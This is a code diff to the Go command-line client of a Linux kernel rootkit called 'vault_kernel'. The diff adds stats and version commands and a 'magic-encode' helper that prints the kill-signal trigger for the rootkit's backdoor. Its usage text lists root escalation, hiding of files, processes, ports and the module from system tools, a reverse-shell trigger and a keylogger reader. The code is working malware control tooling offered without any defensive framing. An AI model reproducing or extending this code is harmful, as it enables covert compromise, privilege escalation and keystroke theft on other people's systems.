@@ -11,6 +11,8 @@ import (
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
+const clientVersion = "3.1"
+
 const devicePath = "/dev/vault_kernel"
 
 func openDevice() (*os.File, error) {
@@ -180,6 +182,41 @@ func unhideModule(f *os.File) error {
 	return nil
 }
 
+func showStats(f *os.File) error {
+	buf := make([]byte, 4096)
+	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0]))
+	if err != 0 {
+		return err
+	}
+	output := strings.TrimRight(string(buf), "\x00")
+	if output == "" {
+		fmt.Println("(no stats returned)")
+	} else {
+		fmt.Print(output)
+	}
+	return nil
+}
+
+func magicEncode(word string, port uint16) error {
+	if word == "" {
+		return fmt.Errorf("magic word cannot be empty")
+	}
+	encoded := ioctl.MagicPID(word, port)
+	fmt.Printf("[*] Magic word : %s (hash 0x%04X)\n", word, ioctl.FNV1a16(word))
+	fmt.Printf("[*] Port       : %d\n", port)
+	fmt.Printf("[*] Encoded PID: %d\n", encoded)
+	fmt.Printf("[*] Trigger    : kill -s %d %d\n",
+		ioctl.MagicSignal, encoded)
+	fmt.Printf("[*] (signal %d = glibc SIGRTMIN+1; matches MAGIC_SIGNAL in src/backdoor.c)\n",
+		ioctl.MagicSignal)
+	return nil
+}
+
+func printVersion() {
+	fmt.Printf("vault_kernel CLI v%s (ioctl magic 0xC0, signal trigger %d)\n",
+		clientVersion, ioctl.MagicSignal)
+}
+
 func printUsage() {
 	fmt.Print(`vault_kernel CLI — Kernel Rootkit Control
 
@@ -187,21 +224,24 @@ Usage:
   vault_kernel <command> [arguments]
 
 Commands:
-  status           Check if rootkit is loaded
-  give-root [pid]  Escalate process to root (default: self)
-  hide-file <name> Hide a file/directory
-  unhide-file <name> Reveal a hidden file/directory
-  hide-pid <pid>   Hide a process from ps, top, /proc
-  unhide-pid <pid> Reveal a hidden process
-  hide-port <port> Hide a TCP/UDP port from netstat, ss
-  unhide-port <port> Reveal a hidden port
-  list             List all hidden items
-  shell <ip:port>  Trigger reverse shell
-  magic <word>     Set magic packet trigger word
-  keylog           Read captured keystrokes
-  keylog-clear     Clear keylogger buffer
-  hide-module      Hide rootkit from lsmod
-  unhide-module    Make rootkit visible in lsmod
+  status                  Check if rootkit is loaded
+  give-root [pid]         Escalate process to root (default: self)
+  hide-file <name>        Hide a file/directory
+  unhide-file <name>      Reveal a hidden file/directory
+  hide-pid <pid>          Hide a process from ps, top, /proc
+  unhide-pid <pid>        Reveal a hidden process
+  hide-port <port>        Hide a TCP/UDP port from netstat, ss
+  unhide-port <port>      Reveal a hidden port
+  list                    List all hidden items
+  stats                   Show module stats (version, hooks, counts)
+  shell <ip:port>         Trigger reverse shell
+  magic <word>            Set magic packet trigger word
+  magic-encode <word> <port>  Print the kill() trigger for a word+port
+  keylog                  Read captured keystrokes
+  keylog-clear            Clear keylogger buffer
+  hide-module             Hide rootkit from lsmod
+  unhide-module           Make rootkit visible in lsmod
+  version                 Print client version
 `)
 }
 
@@ -224,6 +264,22 @@ func run() error {
 	if os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "help" {
 		printUsage()
 		return nil
+	}
+
+	if os.Args[1] == "version" || os.Args[1] == "-v" || os.Args[1] == "--version" {
+		printVersion()
+		return nil
+	}
+
+	if os.Args[1] == "magic-encode" {
+		if len(os.Args) < 4 {
+			return fmt.Errorf("usage: vault_kernel magic-encode <word> <port>")
+		}
+		p, err := strconv.Atoi(os.Args[3])
+		if err != nil || p < 1 || p > 65535 {
+			return fmt.Errorf("invalid port: %s", os.Args[3])
+		}
+		return magicEncode(os.Args[2], uint16(p))
 	}
 
 	f, err := openDevice()
@@ -297,6 +353,9 @@ func run() error {
 	case "list":
 		return listHidden(f)
 
+	case "stats":
+		return showStats(f)
+
 	case "shell":
 		if len(os.Args) < 3 {
 			return fmt.Errorf("usage: vault_kernel shell <ip:port>")
@@ -312,6 +371,10 @@ func run() error {
 			return fmt.Errorf("usage: vault_kernel magic <word>")
 		}
 		return backdoorMagic(f, os.Args[2])
+
+	case "version":
+		printVersion()
+		return nil
 
 	case "keylog":
 		return keylogRead(f)
